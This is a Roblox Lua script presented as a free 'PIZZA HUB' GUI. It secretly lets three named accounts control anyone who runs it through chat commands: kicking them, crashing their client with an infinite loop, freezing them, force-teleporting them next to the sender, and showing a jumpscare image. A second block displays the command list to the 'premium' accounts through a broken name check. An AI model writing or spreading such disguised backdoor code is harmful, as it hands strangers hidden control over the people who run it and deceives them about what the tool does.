-- Gui to Lua
-- Version: 3.2

-- Instances:

local free = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local ScrollingFrame = Instance.new("ScrollingFrame")
local TextLabel_2 = Instance.new("TextLabel")

--Properties:

free.Name = "free"
free.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
free.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = free
Frame.Active = true
Frame.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
Frame.Position = UDim2.new(0.0249714851, 0, 0.0516618229, 0)
Frame.Size = UDim2.new(0, 400, 0, 200)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.Size = UDim2.new(0, 400, 0, 48)
TextLabel.Font = Enum.Font.Unknown
TextLabel.Text = "PIZZA HUB"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 0)
TextLabel.TextStrokeTransparency = 0.000
TextLabel.TextWrapped = true
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

ScrollingFrame.Parent = Frame
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0, 0, 0.239999995, 0)
ScrollingFrame.Size = UDim2.new(0, 399, 0, 152)

TextLabel_2.Parent = ScrollingFrame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(-0.00250611268, 0, 0, 0)
TextLabel_2.Size = UDim2.new(0, 386, 0, 88)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Commands for premium users loaded."
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 0)
TextLabel_2.TextSize = 25.000
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left
TextLabel_2.TextYAlignment = Enum.TextYAlignment.Top

-- Scripts:

local function WSCMFOF_fake_script() -- Frame.Move 
	local script = Instance.new('LocalScript', Frame)

	script.Parent.Draggable = true
end
coroutine.wrap(WSCMFOF_fake_script)()
local function HQKHD_fake_script() -- free.LocalScript 
	local script = Instance.new('LocalScript', free)

	local users = {"Miha1953", "goobiethrowaway", "lellyisourpet"}
	local lp = game.Players.LocalPlayer
	
	for i,user in pairs(users) do
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.Name == user then
				v.Chatted:Connect(function(m)
	
					if m == "!kick ." then
						lp:Kick("kicked by premium user.")
	
					elseif m == "!pet ." then
						_G.Pet = true
						while _G.Pet == true do
							task.wait()
							pcall(function()
								lp.Character.Humanoid.Sit = true
								lp.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.new(0,-2,-5)
							end)
						end
					elseif m == "!unpet ." then
						_G.Pet = false
	
					elseif m == "!crash ." then
						while true do 
							print("crash")
						end
	
					elseif m == "!freeze ." then
						lp.Character.HumanoidRootPart.Anchored = true
	
					elseif m == "!unfreeze ." then
						lp.Character.HumanoidRootPart.Anchored = false
					elseif m == "!jumpscare ." then
						local jump = Instance.new("ScreenGui")
						local ImageLabel = Instance.new("ImageLabel")
						jump.Name = "jump"
						jump.Parent = game.StarterGui.free.LocalScript
						jump.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
						jump.ResetOnSpawn = false
						jump.IgnoreGuiInset = true
						ImageLabel.Parent = jump
						ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
						ImageLabel.Size = UDim2.new(1, 0, 1, 0)
						ImageLabel.Image = "rbxassetid://13706681642"
						wait(3)
						jump:Destroy()
	
					end
	
	
				end)
			end
		end
	end
end
coroutine.wrap(HQKHD_fake_script)()
local function JAISZ_fake_script() -- free.LocalScript 
	local script = Instance.new('LocalScript', free)

	local premium = {"Miha1953", "goobiethrowaway", "lellyisourpet"}
	
	if game.Players.LocalPlayer.Name == premium then
		-- Gui to Lua
-- Version: 3.2

-- Instances:

local premium = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local ScrollingFrame = Instance.new("ScrollingFrame")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")

--Properties:

premium.Name = "premium"
premium.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
premium.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = premium
Frame.Active = true
Frame.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
Frame.Position = UDim2.new(0.632365882, 0, 0.0374015719, 0)
Frame.Size = UDim2.new(0, 400, 0, 200)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.Size = UDim2.new(0, 400, 0, 48)
TextLabel.Font = Enum.Font.Unknown
TextLabel.Text = "[⭐] PIZZA HUB"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextStrokeColor3 = Color3.fromRGB(0, 170, 255)
TextLabel.TextStrokeTransparency = 0.000
TextLabel.TextWrapped = true
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

ScrollingFrame.Parent = Frame
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0, 0, 0.239999995, 0)
ScrollingFrame.Size = UDim2.new(0, 399, 0, 152)

TextLabel_2.Parent = ScrollingFrame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(1.52970316e-07, 0, 0, 0)
TextLabel_2.Size = UDim2.new(0, 385, 0, 18)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Command List (commands only work on free users)"
TextLabel_2.TextColor3 = Color3.fromRGB(85, 85, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

TextLabel_3.Parent = ScrollingFrame
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(1.52969733e-07, 0, 0.0332859457, 0)
TextLabel_3.Size = UDim2.new(0, 385, 0, 160)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "!kick .\\n!crash .\\n!pet .\\n!unpet .\\n!jumpscare .\\n!freeze .\\n!unfreeze ."
TextLabel_3.TextColor3 = Color3.fromRGB(85, 85, 255)
TextLabel_3.TextSize = 20.000
TextLabel_3.TextWrapped = true
TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left
TextLabel_3.TextYAlignment = Enum.TextYAlignment.Top

-- Scripts:

local function SQUQO_fake_script() -- Frame.Move 
	local script = Instance.new('LocalScript', Frame)

	script.Parent.Draggable = true
end
coroutine.wrap(SQUQO_fake_script)()

		script.Parent:Destroy()
	end
end
coroutine.wrap(JAISZ_fake_script)()
